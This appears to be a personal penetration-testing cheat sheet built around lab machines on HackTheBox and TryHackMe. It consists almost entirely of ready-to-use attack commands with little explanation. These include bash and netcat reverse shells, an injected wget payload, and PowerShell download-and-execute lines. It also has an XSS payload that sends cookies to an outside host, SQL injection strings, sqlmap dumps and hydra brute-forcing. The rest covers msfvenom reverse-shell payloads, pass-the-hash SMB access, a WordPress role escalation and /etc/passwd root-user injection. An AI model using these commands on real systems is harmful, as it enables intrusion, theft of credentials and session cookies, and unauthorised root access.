## nsupdate 
  dyno Hackthebox (Detailed Explanation) 


## PATH
  echo $PATH
  export PATH=/tmp:$PATH


## SSH
  scp -r CVE-2021-3156 jake@10.10.75.244:/tmp/ ------- FILE UPLOADING <br>

  ssh -L 8000:127.0.0.1:8000 roy@10.10.10.212 ---------- PORTFORWARDING <br>

  ssh jeff@jeff.thm -t "bash --noprofile

## POWERSHELL
  powershell -c "Invoke-WebRequest -Uri 'http://10.8.3.38:8081/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'" <br>

  Invoke-WebRequest "http://10.10.14.4/winPEAS.exe" -OutFile winpeas.exe ---- DOWNLOAD COMMAND for windows <br>

  powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:8000/shell-name.exe','shell-name.exe')" <br>


## LFTP LOGIN  
  (alternative of ftp (to exploit/gather more information in vulnerable ftp's)) <br>
#### Setup
  
lftp : set ftp:ssl-force true
lftp : connect 10.10.10.208 <br>
lftp 10.10.10.208 : set ssl:verify-certificate no <br>
lftp 10.10.10.208 :  login ftpadm <br>


## WGET REVERSESHELL(ssti)

  wget http://<your-ip>/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'<your-ip>'$IFS'<port>' ($IFS = spaces)
  
  
# LOG FILE MISSCONFIGURATION

;/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/4444 0>&1' <br>

echo "  ; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/1234 0>&1' #" > hackers

  
#HYDRA LOGIN FORM BRUTEFORCE


hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.89.143^Cttp-post-form "/admin/:user=^USER^&pass=^PASS^:Username or password invalid:H=Cookie: security=low; PHPSESSID=ms2hav3kj1jdenpsvfpj7c66v4 <br>
  
hydra -l rascal -P /usr/share/wordlists/rockyou.txt 10.10.87.34 http-head /  -v -- SMB authentication bypass webiste

# SQL-MAP
## Basic tries to bypass admin pannel
  username = ' or 1=1--

  password = ' or 1=1--


  sqlmap -u http://10.10.44.225/products/2 --current-db --batch <br>
  
  sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch <br>

  sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --dump <br>

  sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch --dump <br>

  sqlmap -u http://10.10.44.225/products/2 duckyinc --tables --batch Y  --dump <br>

  sqlmap -u http://10.10.44.225/products/2 duckyinc --batch  --dump <br>

  UPDATE runcheck SET [REDACTED] = 1; - FOR CHANGING VALUE IN TABLE <br>

  sql injection -- AND 1=2 union select message_content,1,2,3 from messages where id=1 <br> 
### SQL COMMAND IN SITE

  AND 1=2 union select group_concat(column_name),1,1,1 from information_schema.columns where table_schema=database()-- <br>

  AND 1=2 union select group_concat(table_name),1,1,1 from information_schema.tables where table_schema=database()-- <br>

  AND 1=2 union select database(),@@version,1,1 <br>

  ' UNION SELECT '123' AS password# -- for sql error ' -- password=123 

## FIND COMMANDS
  find / -perm -u=s -type f 2>/dev/null <br>
  
  find / -perm -u=s -type f 2>/dev/null <br>
  
  find / -group users -type f 2>/dev/null <br>
  
  find / -user jeff 2>/dev/null <br>

  find / -name "*s3cr3t*" 2>/dev/null #FIND SPECIFIC FILE USING FILE COMMAND 
  
## PYTHON FOR STABLE-SHELL

python3 -c 'import pty;pty.spawn("/bin/bash")' <br>
ctrl + z <br>
stty raw -echo <br>
fg <br>
ENTER <br>
ENTER <br>
Python -c 'import os; os.setuid(0); os.system("/bin/sh")' --- PYTHON ROOT SHELL
  
## LINUX CAPABILITIES

  getcap -r / --- command

  
## XSS RcE 

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc &10.9.20.61 1234 >/tmp/f
<img src=x onerror=this.src="http://10.9.20.61:8000/?c="+document.cookie>


## WORDPRESS REVERSE SHELL METASPLOIT

msf > use exploit/unix/webapp/wp_admin_shell_upload <br>

zip <name you save zip> php ------> plugin reverseshell <br>

https://aptx1337.github.io/posts/thm/forbusinessreasons.html --another diff way revershell :) <br>

if you logged as wordpress admin pannel but your not a admin ? <br>

go and click update profile then 'add our request' like this before action=update
&ure_other_roles=administrator& 
  
## smb-enum

smbclient //10.10.145.93/nt4wrksv <br>

smbclient --no-pass //10.10.88.228/shares <br>

smbclient --no-pass -L //<IP> # Null user <br>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash <br>
smbmap -H <IP> [-P <PORT>] #Null user <br>
smbmap -u "username" -p "password" -H <IP> [-P <PORT>] #Creds <br>
smbmap -u "username" -p "<NT>:<LM>" -H <IP> [-P <PORT>] #Pass-the-Hash <br>

#Connect using smbclient <br>
smbclient --no-pass //<IP>/<Folder> <br>
smbclient -U 'username[%passwd]' -L [--pw-nt-hash] //<IP> #If you omit the pwd, it will be prompted. With --pw-nt-hash, the pwd provided is the NT hash <br>
#Use --no-pass -c 'recurse;ls'  to list recursively with smbclient <br>

#List with smbmap, without folder it list everything <br>
smbmap [-u "username" -p "password"] -R [Folder] -H <IP> [-P <PORT>] # Recursive list <br>
smbmap [-u "username" -p "password"] -r [Folder] -H <IP> [-P <PORT>] # Non-Recursive list <br>
smbmap -u "username" -p "<NT>:<LM>" [-r/-R] [Folder] -H <IP> [-P <PORT>] #Pass-the-Hash <br>
  
  > some data(smb) get from hacktricks book

## MOUNT

showmount -e 10.10.150.51 <br>
THEN <br>
 mount -t nfs 10.10.150.51:/opt/conf conf
  

## MSFVENOM

msfvenom -p cmd/unix/reverse_netcat lhost=10.14.11.120 lport=9080 R --netcat rce/shell (abuse-cron) <br>
  
### Linux
  msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.9.20.61 LPORT=9001 -f elf > reverse.elf <br>
 
### WINDOWS

msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php 

msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.**.** LPORT=2345 -f exe -o revshell.exe //meterpreter 
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.11.36.50 LPORT=9001 -f aspx > re.aspx
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
  
## /etc/passwd abuse in writeable format

openssl passwd -1 -salt [name] [password]
username:passwordhash:0:0:root:/root:/bin/bash(format to update etc/passwd file)



